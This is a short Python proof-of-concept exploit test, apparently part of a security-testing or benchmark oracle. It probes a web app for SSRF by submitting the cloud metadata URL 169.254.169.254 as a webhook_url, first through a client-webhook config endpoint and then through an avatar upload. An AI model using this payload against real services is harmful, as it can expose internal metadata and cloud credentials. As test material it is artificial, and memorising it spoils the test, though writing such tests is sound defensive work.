"""PoC: SSRF via upload webhook_url in request body (CWE-918)."""
from mosaic.oracle.exploit import ExploitTest


class UploadWebhookSSRFExploit(ExploitTest):
    @property
    def chain_id(self):
        return "fileupload_ssrf_callback"

    def setup(self):
        pass

    def execute(self):
        ssrf_target = "http://169.254.169.254/latest/meta-data/"

        # Try to register a client webhook with an internal URL
        config_resp = self.http_post("/config/client-webhook", json={
            "client_id": "ssrf_test",
            "webhook_url": ssrf_target,
        })

        if config_resp.ok:
            return True, (
                f"SSRF vector confirmed via client webhook config. "
                f"Server accepted internal URL {ssrf_target} as "
                f"webhook target. Config status: {config_resp.status_code}."
            )

        # Try upload with webhook_url in body (multipart may not carry it,
        # but the code reads from req.body)
        import io
        resp = self.http_post(
            "/upload-avatar",
            files={"avatar": ("test.jpg", io.BytesIO(b"\xff\xd8\xff\xe0test"), "image/jpeg")},
            data={"webhook_url": ssrf_target, "client_id": "test"},
        )

        if resp.ok:
            return True, (
                f"SSRF vector confirmed. Upload accepted with "
                f"webhook_url={ssrf_target}. Server will POST "
                f"file metadata to attacker-controlled URL."
            )

        return False, (
            f"SSRF exploit inconclusive. "
            f"Config: {config_resp.status_code}. "
            f"Upload: {resp.status_code}."
        )
